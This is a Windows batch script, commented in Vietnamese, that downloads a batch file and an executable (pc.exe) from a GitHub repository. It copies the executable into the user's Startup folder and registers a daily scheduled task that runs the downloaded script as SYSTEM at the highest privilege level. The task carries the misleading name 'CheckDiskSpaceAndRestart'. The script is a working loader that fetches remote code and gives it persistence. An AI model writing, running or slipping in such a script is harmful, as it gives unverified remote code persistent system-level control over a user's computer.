@echo off
setlocal enabledelayedexpansion

:: Nhập URL của các tệp bạn muốn tải xuống từ GitHub
set "cleanUrl=https://raw.githubusercontent.com/quannqttg/emulators/main/clean.bat"
set "pcUrl=https://github.com/quannqttg/emulators/raw/main/pc.exe"

:: Lấy tên người dùng hiện tại từ biến môi trường USERNAME
set "userDir=%USERNAME%"
set "animeDir=C:\Users\%userDir%\Desktop\anime"
echo Checking for user directory: !userDir!
echo Anime directory path: !animeDir!

if exist "!animeDir!" (
    echo User directory "!userDir!" exists: "!animeDir!"

    :SkipToClean
    :: Tải xuống tệp clean.bat
    echo Downloading clean.bat to "!animeDir!"...
    curl -L -o "!animeDir!\clean.bat" "!cleanUrl!"
    if errorlevel 1 (
        echo Failed to download clean.bat. Check the URL and your network connection.
        goto :SkipToCopyPC
    )
    echo File downloaded successfully to "!animeDir!\clean.bat".

    :SkipToCopyPC
    :: Tải xuống tệp pc.exe
    echo Downloading pc.exe to "!animeDir!"...
    curl -L -o "!animeDir!\pc.exe" "!pcUrl!"
    if errorlevel 1 (
        echo Failed to download pc.exe. Check the URL and your network connection.
        goto :SkipToNext
    )
    echo File downloaded successfully to "!animeDir!\pc.exe".

    :: Xác định thư mục Startup
    set "startupDir=C:\Users\%userDir%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    :: In ra đường dẫn thư mục Startup
    echo Startup directory path: "!startupDir!"

    :: Sao chép tệp pc.exe vào thư mục Startup
    echo Copying pc.exe to "!startupDir!"...
    if not exist "!startupDir!" (
        echo Startup directory does not exist. Creating it...
        mkdir "!startupDir!"
    )
    copy "!animeDir!\pc.exe" "!startupDir!\pc.exe" >nul
    if errorlevel 1 (
        echo Failed to copy pc.exe to Startup directory.
        goto :SkipToNext
    )
    echo pc.exe copied successfully to "!startupDir!".

    :: Tạo tác vụ lên lịch
    set TaskName=CheckDiskSpaceAndRestart
    schtasks /delete /tn "!TaskName!" /f
    schtasks /create /tn "!TaskName!" /tr "!animeDir!\clean.bat" /sc daily /st 12:00 /ru "SYSTEM" /rl highest /f
    echo Scheduled task "!TaskName!" has been created to run "!animeDir!\clean.bat" at 12:00 daily.
) else (
    echo User directory "!userDir!" does not exist or Desktop\anime not found. Skipping to next user...
)

:SkipToNext
endlocal
pause
